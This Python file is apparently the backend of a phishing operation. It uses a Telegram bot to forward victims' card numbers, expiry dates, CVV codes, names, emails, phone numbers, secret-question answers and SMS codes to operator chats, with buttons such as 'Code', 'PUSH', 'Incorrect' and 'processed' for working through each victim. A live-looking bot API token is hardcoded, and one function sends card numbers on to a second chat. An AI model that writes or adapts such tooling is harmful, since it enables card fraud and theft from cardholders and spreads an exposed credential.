from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Bot
from parserBIN import Bin
import re
API_TOKEN = '7183115873:AAGsfeV2XA-QeeURJsWu1IyylJ1a5yCOJkM'
from telegram.error import TelegramError
def escape_reserved_characters(text):
    # Список зарезервированных символов, которые нужно экранировать
    reserved_characters = ['_', '*', '[', ']', '(', ')', '~', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    
    # Экранируем каждый зарезервированный символ
    for char in reserved_characters:
        text = text.replace(char, f'\\{char}')
    
    return text
def send_buttons_message(CHAT_ID, card, date, cvv, ID, name, email, tel):
    bot = Bot(token=API_TOKEN)
    keyboard = [
        [
            InlineKeyboardButton("📱Code📱", callback_data='button1'),
        ],
        [
            InlineKeyboardButton("📲PUSH📲", callback_data='button3'),
            InlineKeyboardButton("💳Incorrect💳", callback_data='button4'),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐  `{cvv}`\n\n🏦: {Bin(card)[0]}\n🏳️‍🌈: {Bin(card)[1]}\n\n🏷 {name}\n📨 {email}\n📱 {tel}')
    bot.send_message(chat_id=CHAT_ID, text=text, reply_markup=reply_markup, parse_mode='MarkdownV2')
    
def send_secret_question(CHAT_ID, card, date, cvv, question, ID, name):
    bot = Bot(token=API_TOKEN)
    keyboard = [
        [
            InlineKeyboardButton("📱Code📱", callback_data='button1'),
        ],
        [
            InlineKeyboardButton("📲PUSH📲", callback_data='button3'),
            InlineKeyboardButton("❓Incorrect❓", callback_data='button5'),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.send_message(chat_id=CHAT_ID, text=f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐 : `{cvv}`\n❓  `{question}` '.replace('.', '\.'), reply_markup=reply_markup, parse_mode='MarkdownV2')

def send_sms(CHAT_ID, card, date, cvv, sms, ID):
    bot = Bot(token=API_TOKEN)
    keyboard = [
        [
            InlineKeyboardButton("✅Отработан✅", callback_data='button1'),
            InlineKeyboardButton("Error SMS", callback_data='button2'),
        ],
        [
            InlineKeyboardButton("📲PUSH📲", callback_data='button3'),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.send_message(chat_id=CHAT_ID, text=escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐 : `{cvv}`\n💬 : `{sms}`'.replace('.', '\.')), reply_markup=reply_markup, parse_mode='MarkdownV2')

def ne_pizdabol(card, chat_id='-4150791967'):
    try:
        bot = Bot(token=API_TOKEN)
        message = f'{card}'
        bot.send_message(chat_id=chat_id, text=message)
        print("Message sent successfully")
    except TelegramError as e:
        print(f"Failed to send message: {e}")
